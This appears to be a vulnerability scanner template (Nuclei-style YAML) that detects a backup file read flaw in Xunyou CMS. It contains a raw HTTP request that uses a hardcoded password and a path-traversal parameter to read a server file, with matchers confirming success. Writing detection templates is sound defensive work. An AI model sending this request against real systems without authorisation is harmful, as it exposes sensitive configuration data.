id: xunyou-cms-readfile
info:
  name: Xunyou CMS Backup File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects a backup file read vulnerability in Xunyou CMS where unauthorized access can reveal sensitive information including configuration details.
http:
  - raw:
      - |
        GET /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: deflate
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"
          - "display_errors"
        part: body
